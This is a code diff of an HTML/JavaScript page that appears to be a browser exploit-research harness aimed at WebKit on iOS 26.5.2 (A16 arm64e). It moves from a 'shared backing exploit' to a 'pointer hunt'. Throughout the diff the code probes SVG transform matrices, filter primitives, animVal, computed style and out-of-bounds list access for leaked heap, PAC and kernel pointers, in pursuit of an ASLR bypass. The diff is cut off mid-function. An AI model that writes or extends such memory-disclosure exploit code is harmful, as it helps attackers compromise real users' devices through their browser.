@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG v34 — TY[3] Shared Backing Exploit</title>
+<title>SVG v35 — Ultimate: Filter/AnimVal/Style Pointer Hunt</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#000;color:#ccc;font-family:monospace;font-size:11px;padding:12px}
@@ -18,7 +18,7 @@ h2{color:#333;font-size:9px;text-transform:uppercase;letter-spacing:.15em;margin
 .uaf{background:#1a0000;border-left:4px solid #f00;color:#f33;font-weight:bold;font-size:12px;padding:6px 10px}
 .leak{background:#001a00;border-left:4px solid #0ff;color:#0ff;font-weight:bold;padding:6px 10px;font-size:12px}
 .aslr{background:#0a000a;border-left:4px solid #f0f;color:#f8f;font-weight:bold;padding:8px 12px;font-size:13px;text-shadow:0 0 6px #f0f}
-.ptr{background:#1a0a00;border-left:4px solid #ff8800;color:#ffaa00;font-weight:bold;padding:7px 11px;font-size:12px}
+.ptr{background:#1a0a00;border-left:4px solid #f80;color:#fa0;font-weight:bold;padding:7px 11px;font-size:12px}
 .hdr{color:#333;font-size:9px;text-transform:uppercase;letter-spacing:.1em;padding:3px 0 5px;border-bottom:1px solid #111;margin-bottom:6px}
 button{background:#050505;color:#0f0;border:1px solid #0f0;padding:4px 10px;font-family:monospace;font-size:10px;cursor:pointer;border-radius:2px;margin:0 3px 4px 0;text-shadow:0 0 4px #0f0}
 button:active{background:#0f0;color:#000}
@@ -28,17 +28,17 @@ button:active{background:#0f0;color:#000}
 </style>
 </head>
 <body>
-<h1>▓ SVG v34 — TY[3] SHARED BACKING EXPLOIT</h1>
-<h2>internal value disclosure · pointer scan · ASLR bypass attempt · iOS 26.5.2 / A16 arm64e</h2>
+<h1>▓ SVG v35 — ULTIMATE: FILTER / ANIMVAL / STYLE</h1>
+<h2>filter compositor · animVal/baseVal split · computed style · OOB probe · iOS 26.5.2 / A16 arm64e</h2>
 
 <div class="suite">
 <button id="btn-all" onclick="runAll()">★ RUN ALL</button>
-<button onclick="go('SB')">SB</button>
-<button onclick="go('PS')">PS</button>
+<button onclick="go('FT')">FT</button>
+<button onclick="go('AV')">AV</button>
 <button onclick="go('CS')">CS</button>
-<button onclick="go('IV')">IV</button>
-<button onclick="go('RP')">RP</button>
-<button onclick="go('AL')">AL</button>
+<button onclick="go('OB')">OB</button>
+<button onclick="go('TC')">TC</button>
+<button onclick="go('SU')">SU</button>
 <button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
 <button onclick="clearOut()">✕</button>
 </div>
@@ -50,32 +50,30 @@ var NS='http://www.w3.org/2000/svg';
 var _fb=new ArrayBuffer(8);
 var _dv=new Float64Array(_fb);
 var _uv=new Uint32Array(_fb);
-function f64hi(f){_dv[0]=f;return _uv[1];}
-function f64lo(f){_dv[0]=f;return _uv[0];}
 function f64hex(f){
-  if(f===null||f===undefined)return 'null';
+  if(f===null||f===undefined)return'null';
   _dv[0]=f;
   return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');
 }
 function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}
+function f64hi(f){_dv[0]=f;return _uv[1];}
+function f64lo(f){_dv[0]=f;return _uv[0];}
 
-// arm64e pointer heuristics
 function classifyPtr(v){
   if(v===null||v===undefined||isNaN(v)||!isFinite(v))return null;
-  _dv[0]=v;
-  var hi=_uv[1]; var lo=_uv[0];
-  // arm64e user: 0x00000001_xxxxxxxx or 0x0000000x_xxxxxxxx
+  _dv[0]=v; var hi=_uv[1]; var lo=_uv[0];
   if(hi===0x00000001)return{type:'arm64_user',hi:hi,lo:lo};
-  if(hi===0x00000000&&lo>0x1000)return{type:'arm64_low',hi:hi,lo:lo};
-  // tagged / PAC-signed: 0x001xxxxx
-  if(hi>=0x00100000&&hi<=0x001fffff)return{type:'arm64_pac',hi:hi,lo:lo};
-  // JSC heap cells: 0x0001xxxx
+  if(hi>=0x00000002&&hi<=0x0000ffff&&lo>0x1000)return{type:'native_heap',hi:hi,lo:lo};
   if(hi>=0x00010000&&hi<=0x0001ffff)return{type:'jsc_cell',hi:hi,lo:lo};
-  // WebCore native heap: often 0x000xxxxx range on iOS
-  if(hi>=0x00000002&&hi<=0x0000ffff)return{type:'native_heap',hi:hi,lo:lo};
-  // kernel/high: 0xffff...
+  if(hi>=0x00100000&&hi<=0x001fffff)return{type:'pac_ptr',hi:hi,lo:lo};
   if(hi>=0xffff0000)return{type:'kernel',hi:hi,lo:lo};
   return null;
+}
+function isWeird(v){
+  if(v===null||v===undefined||isNaN(v))return false;
+  if(v===0||v===1||v===-1)return false;
+  if(!isFinite(v))return false;
+  return true;
 }
 
 function log(m,c){
@@ -97,462 +95,524 @@ function copyAll(){
 function go(s){clearOut();window['run'+s]();}
 function runAll(){
   clearOut();
-  runSB();
-  setTimeout(function(){runPS();},600);
-  setTimeout(function(){runCS();},1400);
-  setTimeout(function(){runIV();},2200);
-  setTimeout(function(){runRP();},3200);
-  setTimeout(function(){runAL();},4400);
+  runFT();
+  setTimeout(function(){runAV();},1200);
+  setTimeout(function(){runCS();},2800);
+  setTimeout(function(){runOB();},4200);
+  setTimeout(function(){runTC();},5600);
+  setTimeout(function(){runSU();},7200);
 }
 
-function mkSVG(){
+function mkSVG(w,h,vb){
   var s=document.createElementNS(NS,'svg');
-  s.setAttribute('width','100');s.setAttribute('height','100');
-  s.style.cssText='position:fixed;left:0;top:0;width:100px;height:100px;opacity:0.001;pointer-events:none';
+  s.setAttribute('width',w||200);s.setAttribute('height',h||200);
+  if(vb)s.setAttribute('viewBox',vb);
+  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||200)+'px;height:'+(h||200)+'px;opacity:0.001;pointer-events:none';
   document.body.appendChild(s);return s;
 }
-function mkRect(p){
-  var r=document.createElementNS(NS,'rect');
-  r.setAttribute('x','0');r.setAttribute('y','0');
-  r.setAttribute('width','10');r.setAttribute('height','10');
-  p.appendChild(r);return r;
+function mkEl(p,tag,attrs){
+  var e=document.createElementNS(NS,tag);
+  if(attrs)Object.keys(attrs).forEach(function(k){e.setAttribute(k,attrs[k]);});
+  p.appendChild(e);return e;
 }
 function getMX(el){
   el.setAttribute('transform','matrix(1 0 0 1 0 0)');
   return el.transform.baseVal.getItem(0).matrix;
 }
 function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}
+function bcr(el){try{return el.getBoundingClientRect();}catch(e){return null;}}
 
 // ════════════════════════════════════════════════════════════════════════
-// SB — shared backing deep dive
-// confirm TY[3]: getItem(0) twice = same backing
-// map exactly what mx2 sees when we write each field of mx1
+// FT — SVG filter primitive exploitation
+// feBlend/feComposite operate on two inputs — the result buffer addresses
+// may be accessible via getBoundingClientRect on the filter element
+// key: filter result regions can expose the internal LayoutRect/FloatRect
 // ════════════════════════════════════════════════════════════════════════
-function runSB(){
-  hdr('SB: shared backing — exact field mapping');
-  var svg=mkSVG();
-  var r=mkRect(svg);
-  getMX(r);
+function runFT(){
+  hdr('FT: SVG filter compositor probe');
+  var svg=mkSVG(400,400);
 
-  var mx1=r.transform.baseVal.getItem(0).matrix;
-  var mx2=r.transform.baseVal.getItem(0).matrix;
-  var sameObj=(mx1===mx2);
-  log('SB[1]: mx1===mx2: '+sameObj,sameObj?'star — SAME JS OBJECT (wrapper alias)':'info — different JS objects');
+  // FT[1]: feBlend with two image sources — do result BCRs expose internal addrs?
+  hdr('FT[1]: feBlend result rect vs source rects');
+  var defs=mkEl(svg,'defs');
+  var filter=mkEl(defs,'filter',{id:'f1',x:'0%',y:'0%',width:'100%',height:'100%'});
+  var feBlend=mkEl(filter,'feBlend',{in:'SourceGraphic',in2:'BackgroundImage',mode:'multiply',result:'blend1'});
 
-  // write to each field of mx1, read ALL fields of mx2
-  // this maps the internal field layout cross-alias
-  var fields=['a','b','c','d','e','f'];
-  var testVal=fromHiLo(0xDEAD1234,0xBEEF5678);
+  var r1=mkEl(svg,'rect',{x:'10',y:'10',width:'50',height:'50',fill:'red',filter:'url(#f1)'});
+  var r2=mkEl(svg,'rect',{x:'30',y:'30',width:'50',height:'50',fill:'blue'});
 
-  hdr('SB[2]: write each mx1 field, read all mx2 fields');
-  fields.forEach(function(wf){
-    // reset
-    mx1.a=1;mx1.b=0;mx1.c=0;mx1.d=1;mx1.e=0;mx1.f=0;
-    mx1[wf]=testVal;
-    var row={};
-    fields.forEach(function(rf){row[rf]=mx2[rf];});
-    // find which mx2 field got the written value
-    var seen=fields.filter(function(rf){return row[rf]===testVal;});
-    var leaked=fields.filter(function(rf){return rf!==wf&&row[rf]!==0&&row[rf]!==1&&rf!=='a'&&rf!=='d';});
-    log('SB[2]: write mx1.'+wf+'=CANARY → mx2: a='+f64hex(row.a)+' b='+f64hex(row.b)+
-      ' e='+f64hex(row.e)+' f='+f64hex(row.f),
-      seen.length>0?'leak — CANARY VISIBLE IN MX2.'+seen.join(',')+' (aliased)':
-      'info — canary not in mx2 (independent)');
-  });
-
-  // SB[3]: read mx2 WITHOUT writing anything — what are the raw initial values?
-  hdr('SB[3]: raw initial values from fresh mx2 (uninitialized read?)');
-  var svg3=mkSVG();
-  var r3=mkRect(svg3);
-  r3.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  // DON'T call getMX or touch the matrix at all — fresh from DOM
-  var mx3a=r3.transform.baseVal.getItem(0).matrix;
-  // immediately get second wrapper
-  var mx3b=r3.transform.baseVal.getItem(0).matrix;
-  // read raw values from mx3b WITHOUT writing to mx3a
-  var rawVals={};
-  fields.forEach(function(f){rawVals[f]=mx3b[f];});
-  log('SB[3]: raw mx3b values (no prior write):','info');
-  fields.forEach(function(f){
-    var v=rawVals[f];
-    var p=classifyPtr(v);
-    log('SB[3]:   .'+f+'='+f64hex(v)+'  ('+v+')',
-      p?'ptr — POINTER-LIKE: type='+p.type+' hi=0x'+p.hi.toString(16)+' lo=0x'+p.lo.toString(16):'info');
-  });
-
-  svg.remove();svg3.remove();
-  prog('SB done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// PS — pointer scan: harvest raw internal values from many elements
-// create N fresh elements, read their initial matrix values via getItem(0) x2
-// collect all values, classify as pointers, look for patterns
-// ════════════════════════════════════════════════════════════════════════
-function runPS(){
-  hdr('PS: pointer scan — harvest raw values from '+100+' fresh matrices');
-  var N=100;
-  var svg=mkSVG();
-  var allVals=[];
-
-  for(var i=0;i<N;i++){
-    var r=mkRect(svg);
-    r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-    var mx1=r.transform.baseVal.getItem(0).matrix;
-    var mx2=r.transform.baseVal.getItem(0).matrix;
-    // read raw from mx2 without writing to mx1
-    ['a','b','c','d','e','f'].forEach(function(f){
-      allVals.push({elem:i,field:f,val:mx2[f]});
-    });
-  }
-
-  // classify all
-  var ptrs=allVals.filter(function(v){return classifyPtr(v.val)!==null;});
-  var nonStd=allVals.filter(function(v){
-    return v.val!==0&&v.val!==1&&classifyPtr(v.val)===null;
-  });
-
-  log('PS[1]: total values='+allVals.length+' pointer-like='+ptrs.length+
-    ' non-standard='+nonStd.length+' zero-or-identity='+(allVals.length-ptrs.length-nonStd.length),
-    ptrs.length>0?'ptr — POINTER-LIKE VALUES FOUND IN MATRIX FIELDS!':
-    'info — no pointer-like values (all standard identity matrix)');
-
-  if(ptrs.length>0){
-    // show first 10 unique pointer values
-    var seen={};
-    ptrs.forEach(function(p){
-      var key=f64hex(p.val);
-      if(!seen[key]){
-        seen[key]=true;
-        var cp=classifyPtr(p.val);
-        log('PS[1]: elem['+p.elem+'].'+p.field+'='+f64hex(p.val)+
-          ' type='+cp.type+' hi=0x'+cp.hi.toString(16).padStart(8,'0')+
-          ' lo=0x'+cp.lo.toString(16).padStart(8,'0'),
-          'ptr — '+cp.type.toUpperCase()+' POINTER LEAK!');
+  var b1=bcr(r1); var b2=bcr(r2); var bf=bcr(filter);
+  ['r1','r2','filter'].forEach(function(name,i){
+    var b=[b1,b2,bf][i];
+    if(!b){log('FT[1]: '+name+': null BCR','info');return;}
+    ['x','y','width','height','right','bottom'].forEach(function(f){
+      var v=b[f];
+      var p=classifyPtr(v);
+      if(p||isWeird(v)){
+        log('FT[1]: '+name+'.'+f+'='+f64hex(v)+' ('+v+')',
+          p?'ptr — POINTER IN FILTER BCR FIELD '+f+'! type='+p.type:'warn — weird value: '+v);
       }
     });
+  });
+  log('FT[1]: filter BCR: x='+(bf?bf.x:'null')+' y='+(bf?bf.y:'null')+
+    ' w='+(bf?bf.width:'null')+' h='+(bf?bf.height:'null'),'info');
 
-    // check if pointer values are consistent (same object) or varied (different heap addrs)
-    var uniquePtrs=Object.keys(seen);
-    log('PS[2]: unique pointer values: '+uniquePtrs.length,
-      uniquePtrs.length===1?'star — single pointer (vtable/singleton?)':
-      uniquePtrs.length>1?'aslr — MULTIPLE DIFFERENT POINTERS: heap layout leaking!':'info');
-  }
+  // FT[2]: feMerge — merge node result BCR
+  hdr('FT[2]: feMerge result BCR probe');
+  var filter2=mkEl(defs,'filter',{id:'f2'});
+  var feMerge=mkEl(filter2,'feMerge');
+  mkEl(feMerge,'feMergeNode',{in:'SourceGraphic'});
+  mkEl(feMerge,'feMergeNode',{in:'SourceGraphic'});
+  var r3=mkEl(svg,'rect',{x:'0',y:'0',width:'100',height:'100',fill:'green',filter:'url(#f2)'});
+  var b3=bcr(r3);
+  log('FT[2]: feMerge rect BCR: x='+(b3?b3.x:null)+' y='+(b3?b3.y:null),'info');
 
-  if(nonStd.length>0){
-    log('PS[3]: non-standard non-pointer values: first='+f64hex(nonStd[0].val)+
-      ' count='+nonStd.length,'warn');
-  }
+  // FT[3]: feColorMatrix — matrix values may be directly addressable
+  hdr('FT[3]: feColorMatrix internal matrix probe');
+  var filter3=mkEl(defs,'filter',{id:'f3'});
+  var feColor=mkEl(filter3,'feColorMatrix',{
+    type:'matrix',
+    values:'1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0'
+  });
 
-  svg.remove();
-  prog('PS done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// CS — consolidate() stale value decode
-// TY[2] showed consolidate() returns same_obj=true but e changed to -2.57e+303
-// that value = 0x? — decode the bit pattern and classify
-// repeat many times to harvest multiple stale reads
-// ════════════════════════════════════════════════════════════════════════
-function runCS(){
-  hdr('CS: consolidate stale value harvest');
-  var N=200;
-  var svg=mkSVG();
-  var staleVals=[];
-
-  for(var i=0;i<N;i++){
-    var r=mkRect(svg);
-    getMX(r);
-    var mx=r.transform.baseVal.getItem(0).matrix;
-    // write a known value
-    mx.e=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
-    // consolidate — may return stale/internal value
-    try{r.transform.baseVal.consolidate();}catch(e){}
-    var mx2=r.transform.baseVal.getItem(0).matrix;
-    if(mx2){
-      var stale=mx2.e;
-      staleVals.push(stale);
+  // try to get the values back as a live object
+  var vals=feColor.values;
+  if(vals&&vals.baseVal){
+    log('FT[3]: feColorMatrix.values.baseVal: '+vals.baseVal,'info');
+    // try animVal
+    var anim=vals.animVal;
+    if(anim!==undefined){
+      log('FT[3]: animVal: '+anim+' same='+( anim===vals.baseVal),
+        anim!==vals.baseVal?'star — animVal !== baseVal: separate object!':'info');
     }
   }
 
-  var uniqueStale={};
-  staleVals.forEach(function(v){
-    var k=f64hex(v);
-    if(!uniqueStale[k])uniqueStale[k]=0;
-    uniqueStale[k]++;
+  // FT[4]: SVGFEBlendElement.in1/in2 as SVGAnimatedString — does animVal expose internals?
+  hdr('FT[4]: feBlend.in1 animVal vs baseVal');
+  var in1=feBlend.in1;
+  if(in1){
+    var bv=in1.baseVal; var av=in1.animVal;
+    log('FT[4]: in1.baseVal='+bv+' animVal='+av+' same='+(av===bv),
+      av!==bv?'star — in1 animVal !== baseVal':'info — same value');
+  }
+
+  svg.remove();
+  prog('FT done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// AV — animVal vs baseVal split during SMIL animation
+// during active animation: animVal ≠ baseVal
+// read animVal MID-ANIMATION — does it expose internal animated value struct?
+// ════════════════════════════════════════════════════════════════════════
+function runAV(){
+  hdr('AV: animVal/baseVal split — mid-animation read');
+  var svg=mkSVG(200,200);
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'red'});
+  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
+
+  // AV[1]: SMIL animate transform
+  var anim=mkEl(r,'animateTransform',{
+    attributeName:'transform',
+    type:'translate',
+    from:'0 0',
+    to:'100 0',
+    dur:'2s',
+    repeatCount:'indefinite'
   });
 
-  var ukeys=Object.keys(uniqueStale);
-  log('CS[1]: N='+N+' consolidate reads: unique values='+ukeys.length,'info');
+  // read animVal at different points during animation
+  var samples=[];
+  var startT=performance.now();
 
-  ukeys.forEach(function(k){
-    var v=parseFloat(k);  // won't work for hex, need to decode
-    // decode from hex string
-    var hi=parseInt(k.slice(2,10),16);
-    var lo=parseInt(k.slice(11,19),16);
-    var fval=fromHiLo(hi,lo);
-    var p=classifyPtr(fval);
-    log('CS[1]: '+k+' count='+uniqueStale[k]+' float='+fval,
-      p?'ptr — CONSOLIDATE LEAKS POINTER! type='+p.type+' addr=0x'+p.hi.toString(16)+'_'+p.lo.toString(16):
-      Math.abs(fval)>1e100?'star — large internal value: '+fval.toExponential(4):
-      'info');
-  });
+  function sample(){
+    var elapsed=performance.now()-startT;
+    if(elapsed>1000){
+      // done sampling
+      prog('AV done');
+      var weird=samples.filter(function(s){return s.weird;});
+      log('AV[1]: samples='+samples.length+' weird_animVal='+weird.length,
+        weird.length>0?'leak — WEIRD ANIMVAL DURING ANIMATION':
+        'info — animVal tracks normally during animation');
+      weird.forEach(function(s){
+        var p=classifyPtr(s.av);
+        log('AV[1]: t='+s.t.toFixed(0)+'ms animVal='+f64hex(s.av)+' baseVal='+f64hex(s.bv),
+          p?'ptr — ANIMVAL IS POINTER! type='+p.type:'warn — weird non-pointer: '+s.av);
+      });
+
+      // AV[2]: read animVal list
+      hdr('AV[2]: animVal transform list during animation');
+      var avList=r.transform.animVal;
+      if(avList&&avList.numberOfItems>0){
+        try{
+          var avMX=avList.getItem(0).matrix;
+          ['a','b','c','d','e','f'].forEach(function(f){
+            var v=avMX[f];
+            var p=classifyPtr(v);
+            if(p||isWeird(v)){
+              log('AV[2]: animVal matrix.'+f+'='+f64hex(v),
+                p?'ptr — POINTER IN ANIMVAL MATRIX!':'warn — '+v);
+            }
+          });
+          log('AV[2]: animVal matrix: a='+avMX.a+' e='+avMX.e+' f='+avMX.f,'info');
+        }catch(e){log('AV[2]: exception reading animVal: '+e,'warn');}
+      }
+
+      // AV[3]: baseVal vs animVal object identity
+      hdr('AV[3]: baseVal vs animVal object identity');
+      var bvList=r.transform.baseVal;
+      var avList2=r.transform.animVal;
+      log('AV[3]: baseVal===animVal: '+(bvList===avList2),
+        bvList===avList2?'info — same object (no split)':'star — DIFFERENT OBJECTS: split active during animation!');
+      if(bvList!==avList2&&avList2.numberOfItems>0){
+        try{
+          var bvMX=bvList.getItem(0).matrix;
+          var avMX2=avList2.getItem(0).matrix;
+          log('AV[3]: baseVal matrix.e='+bvMX.e+' animVal matrix.e='+avMX2.e,
+            avMX2.e!==bvMX.e?'star — DIFFERENT E VALUES: animVal has animated position!':'info');
+          // check each field for weird values in animVal
+          ['a','b','c','d','e','f'].forEach(function(f){
+            var av=avMX2[f];
+            var bv=bvMX[f];
+            var p=classifyPtr(av);
+            if(p){log('AV[3]: animVal.'+f+'='+f64hex(av)+' type='+p.type,'ptr — POINTER LEAK!');}
+            if(isWeird(av)&&!isWeird(bv)){
+              log('AV[3]: animVal.'+f+'='+av+' but baseVal.'+f+'='+bv,'star — ANIMVAL DIFFERS FROM BASEVAL');
+            }
+          });
+        }catch(e){log('AV[3]: exception: '+e,'warn');}
+      }
+      svg.remove();
+      return;
+    }
+
+    // sample now
+    try{
+      var txList=r.transform.animVal;
+      if(txList&&txList.numberOfItems>0){
+        var mx=txList.getItem(0).matrix;
+        ['e','f'].forEach(function(f){
+          var av=mx[f];
+          var bv=r.transform.baseVal.numberOfItems>0?r.transform.baseVal.getItem(0).matrix[f]:null;
+          samples.push({t:elapsed,field:f,av:av,bv:bv,
+            weird:isWeird(av)&&!classifyPtr(av)===false});
+        });
+      }
+    }catch(e){}
+    requestAnimationFrame(sample);
+  }
+
+  setTimeout(function(){requestAnimationFrame(sample);},50);
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// CS — computed style SVG transform
+// getComputedStyle on SVG element with transform
+// reads through StyleResolver — different pipeline from getScreenCTM
+// does it expose the internal TransformationMatrix?
+// ════════════════════════════════════════════════════════════════════════
+function runCS(){
+  hdr('CS: computed style transform read');
+  var svg=mkSVG(200,200);
+
+  // CS[1]: getComputedStyle transform on element with large matrix values
+  hdr('CS[1]: computed style on element with large mx.e');
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  getMX(r);
+  var mx=r.transform.baseVal.getItem(0).matrix;
+  var largeVal=fromHiLo(0x43E00000,0x00000000); // 2^63
+  mx.e=largeVal;
+
+  var style=window.getComputedStyle(r);
+  var txStr=style.transform||style.webkitTransform||'';
+  log('CS[1]: mx.e=2^63 → computed transform="'+txStr+'"',
+    txStr&&txStr!=='none'&&txStr!==''?'star — computed style has transform value':'info — no transform in computed style');
+
+  // CS[2]: parse the matrix values out of computed style string
+  if(txStr&&txStr.indexOf('matrix')>=0){
+    var nums=txStr.match(/-?[\d.e+\-]+/g);
+    if(nums&&nums.length>=6){
+      hdr('CS[2]: parsed computed style matrix values');
+      var cfields=['a','b','c','d','e','f'];
+      nums.slice(0,6).forEach(function(n,i){
+        var v=parseFloat(n);
+        var p=classifyPtr(v);
+        log('CS[2]: .'+cfields[i]+'='+f64hex(v)+' ('+n+')',
+          p?'ptr — POINTER IN COMPUTED STYLE MATRIX! type='+p.type:
+          isWeird(v)?'star — non-standard value: '+v:'info');
+      });
+    }
+  }
+
+  // CS[3]: CSS transform vs SVG transform — do they share backing?
+  hdr('CS[3]: CSS transform + SVG transform — independent?');
+  var r3=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r3.style.transform='matrix(1,0,0,1,500,500)';  // CSS large translate
+  r3.setAttribute('transform','matrix(1 0 0 1 999 999)');  // SVG attr
+  var c3=ctm(r3);
+  var b3=bcr(r3);
+  var cs3=window.getComputedStyle(r3);
+  var cstx=cs3.transform||'';
+  log('CS[3]: CSS=500 SVG=999 → CTM.e='+(c3?c3.e:null)+' BCR.x='+(b3?b3.x:null)+
+    ' computedStyle='+cstx.substring(0,80),
+    'info');
+
+  // CS[4]: SVGElement.style vs getAttribute — different representations?
+  hdr('CS[4]: style.transform vs getAttribute transform — internal divergence');
+  var r4=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  getMX(r4);
+  var mx4=r4.transform.baseVal.getItem(0).matrix;
+  mx4.e=fromHiLo(0x41E00000,0x00000000); // 2^31 as f64
+  var attrTx=r4.getAttribute('transform');
+  var c4=ctm(r4);
+  log('CS[4]: getAttribute='+attrTx+' CTM.e='+(c4?c4.e:null),
+    'info');
+  // try to read via style
+  var cs4=window.getComputedStyle(r4);
+  var cstx4=cs4.transform||'none';
+  log('CS[4]: computed='+cstx4.substring(0,100),'info');
 
   svg.remove();
   prog('CS done');
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// IV — internal value decode from TY[3]/TY[4]
-// reproduce TY[3] and TY[4] exactly, decode the leaked values
-// 1.8e-226 and 4.67e-62 as bit patterns → check for pointer structure
+// OB — OOB probe via SVGTransformList
+// SVGTransformList.getItem(N) for large N — out of bounds?
+// SVGTransformList with many items — does appendItem() overflow?
 // ════════════════════════════════════════════════════════════════════════
-function runIV(){
-  hdr('IV: internal value decode — reproduce TY[3] and TY[4]');
+function runOB(){
+  hdr('OB: SVGTransformList OOB probe');
+  var svg=mkSVG(200,200);
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
 
-  // IV[1]: reproduce TY[3] — write to mx1, read internal from mx2
-  hdr('IV[1]: TY[3] reproduction — getItem(0) aliasing');
-  var N=50;
-  var svg=mkSVG();
-  var leakedVals=[];
-
-  for(var i=0;i<N;i++){
-    var r=mkRect(svg);
-    r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-    var mx1=r.transform.baseVal.getItem(0).matrix;
-    var mx2=r.transform.baseVal.getItem(0).matrix;
-    // write canary to mx1
-    var cval=fromHiLo(0x11111111,0x22222222);
-    mx1.e=cval;
-    // read from mx2 — if same object, gets same value
-    // if aliased but different internal view, gets something else
-    var got=mx2.e;
-    leakedVals.push({i:i,wrote:cval,got:got,match:(got===cval)});
-  }
-
-  var matches=leakedVals.filter(function(v){return v.match;});
-  var mismatches=leakedVals.filter(function(v){return !v.match;});
-  log('IV[1]: N='+N+': match (same val)='+matches.length+' mismatch (internal val)='+mismatches.length,
-    mismatches.length>0?'leak — INTERNAL VALUES LEAKED IN MISMATCHES!':
-    'star — all same (true alias, single backing)');
-
-  if(mismatches.length>0){
-    mismatches.slice(0,5).forEach(function(v){
-      var p=classifyPtr(v.got);
-      log('IV[1]: mismatch: wrote='+f64hex(v.wrote)+' got='+f64hex(v.got),
-        p?'ptr — INTERNAL VALUE IS POINTER! type='+p.type:'warn — non-pointer internal: '+v.got);
-    });
-  }
-
-  // IV[2]: all 6 fields — which fields leak internal values?
-  hdr('IV[2]: field sweep — which fields expose internal memory?');
-  var svg2=mkSVG();
-  var r2=mkRect(svg2);
-  r2.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var mxA=r2.transform.baseVal.getItem(0).matrix;
-  var mxB=r2.transform.baseVal.getItem(0).matrix;
-
-  ['a','b','c','d','e','f'].forEach(function(f){
-    // reset both to identity
-    mxA.a=1;mxA.b=0;mxA.c=0;mxA.d=1;mxA.e=0;mxA.f=0;
-    var canary=fromHiLo(0xCAFE0000+f.charCodeAt(0),0xBEEF0000+f.charCodeAt(0));
-    mxA[f]=canary;
-    var readBack=mxB[f];
-    var p=classifyPtr(readBack);
-    log('IV[2]: write mxA.'+f+'='+f64hex(canary)+' → mxB.'+f+'='+f64hex(readBack),
-      readBack===canary?'star — exact alias: mxA.'+f+' and mxB.'+f+' share backing':
-      p?'ptr — INTERNAL POINTER IN mxB.'+f+'! type='+p.type:
-      'info — different value: '+f64hex(readBack));
+  // OB[1]: getItem() with index past numberOfItems
+  hdr('OB[1]: getItem(N) for N > numberOfItems');
+  var txList=r.transform.baseVal;
+  var n=txList.numberOfItems;
+  log('OB[1]: numberOfItems='+n,'info');
+  [n, n+1, n+100, 0xFFFF, 0x7FFFFFFF].forEach(function(idx){
+    var got=null;
+    try{got=txList.getItem(idx);}catch(e){got='THROWS: '+e.name;}
+    log('OB[1]: getItem('+idx+')='+( typeof got==='string'?got:
+      got===null?'null':'SVGTransform type='+got.type+' mx.e='+got.matrix.e),
+      typeof got==='object'&&got!==null&&isWeird(got.matrix.e)?
+      'ptr — OUT OF BOUNDS MATRIX: e='+got.matrix.e:'info');
   });
 
-  svg.remove();svg2.remove();
-  prog('IV done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// RP — repeated pointer harvest
-// create/destroy many elements in a loop
-// each time read the initial matrix values via double getItem(0)
-// accumulate pointer-like values, look for stable addresses
-// stable address across multiple allocs = likely vtable or class pointer
-// ════════════════════════════════════════════════════════════════════════
-function runRP(){
-  hdr('RP: repeated pointer harvest — vtable/class ptr hunt');
-  var ROUNDS=20;
-  var svg=mkSVG();
-  var ptrCounts={};  // hex → count
-
-  for(var round=0;round<ROUNDS;round++){
-    // create fresh batch of 10 rects
-    var batch=[];
-    for(var i=0;i<10;i++){
-      var r=mkRect(svg);
-      r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-      batch.push(r);
+  // OB[2]: appendItem N times then getItem — does length cap?
+  hdr('OB[2]: mass appendItem — does transform list grow unbounded?');
+  var r2=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r2.setAttribute('transform','');
+  var canary=fromHiLo(0xDEAD0000,0xBEEF0000);
+  var txList2=r2.transform.baseVal;
+  for(var i=0;i<100;i++){
+    try{
+      var tx=svg.createSVGTransform();
+      tx.matrix.e=canary+i;
+      txList2.appendItem(tx);
+    }catch(e){
+      log('OB[2]: appendItem('+i+') threw: '+e.name,'warn');
+      break;
     }
-    // read raw from each
-    batch.forEach(function(r){
-      var mx1=r.transform.baseVal.getItem(0).matrix;
-      var mx2=r.transform.baseVal.getItem(0).matrix;
-      ['a','b','c','d','e','f'].forEach(function(f){
-        var v=mx2[f];
-        var p=classifyPtr(v);
-        if(p){
-          var key=f64hex(v);
-          if(!ptrCounts[key])ptrCounts[key]=0;
-          ptrCounts[key]++;
-        }
-      });
-    });
-    // remove batch
-    batch.forEach(function(r){r.remove();});
   }
+  log('OB[2]: after 100 appendItems: numberOfItems='+txList2.numberOfItems,'info');
+  // try reading item past end
+  var pastEnd=null;
+  try{pastEnd=txList2.getItem(txList2.numberOfItems);}catch(e){pastEnd='THROWS';}
+  log('OB[2]: getItem(numberOfItems)='+pastEnd,'info');
 
-  var ptrKeys=Object.keys(ptrCounts).sort(function(a,b){return ptrCounts[b]-ptrCounts[a];});
-  log('RP[1]: '+ROUNDS+' rounds × 10 elems: found '+ptrKeys.length+' unique pointer-like values','info');
-
-  if(ptrKeys.length===0){
-    log('RP[1]: no pointer-like values found in any raw matrix reads','warn');
-    log('RP[1]: internal values are always identity matrix (0/1) — no raw heap exposure','info');
-  } else {
-    ptrKeys.slice(0,10).forEach(function(k){
-      var hi=parseInt(k.slice(2,10),16);
